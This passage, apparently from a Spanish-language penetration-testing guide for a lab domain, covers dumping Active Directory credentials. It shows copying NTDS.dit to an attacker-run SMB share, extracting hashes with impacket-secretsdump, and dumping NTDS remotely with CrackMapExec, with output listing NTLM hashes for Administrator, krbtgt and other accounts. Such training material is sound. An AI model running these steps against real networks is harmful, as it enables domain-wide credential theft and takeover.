-a----         4/1/2024  12:13 AM       18874368 NTDS.dit
```

Ahora nos transferimos el archivo `NTDS.dit` a nuestro equipo de atacante de la siguiente manera:

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ sudo impacket-smbserver -smb2support CompData /home/kali/Descargas/
```

{% endcode %}

```powershell
*Evil-WinRM* PS C:\> move NTDS.dit \\10.10.15.239\CompData
```

<figure><img src="/files/BuKlnNWRB8j4heXNIqzg" alt=""><figcaption></figcaption></figure>

Ya tenemos el archivo `NTDS.dit` en `home/kali/Descargas.`

#### **Extraer los Hashes**

Podemos usar `impacket-secretsdump` para extraer los hashes del archivo NTDS.dit.

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM_LOCAL_FILE -outputfile hashes_ntds LOCAL
```

Esto generará un archivo con hashes en el formato LM/NTLM.

#### Volcado de NTDS con CrackMapExec

De igual manera, podemos usar un usuario privilegiado para dumpear el NTDS con CrackmapExec, más rápido y sencilo:

```
crackmapexec smb 10.129.208.90 -u jmarston -p P@ssword! --ntds

SMB         10.129.208.90   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.208.90   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
SMB         10.129.208.90   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.208.90   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
SMB         10.129.208.90   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.208.90   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
SMB         10.129.208.90   445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
SMB         10.129.208.90   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
SMB         10.129.208.90   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
SMB         10.129.208.90   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
SMB         10.129.208.90   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:974f341ecc0ab1b83d6dca8c8c1e4771:::
SMB         10.129.208.90   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
SMB         10.129.208.90   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/kali/.cme/logs/ILF-DC01_10.129.208.90_2025-01-16_201737.ntds of which 7 were added to the database
```
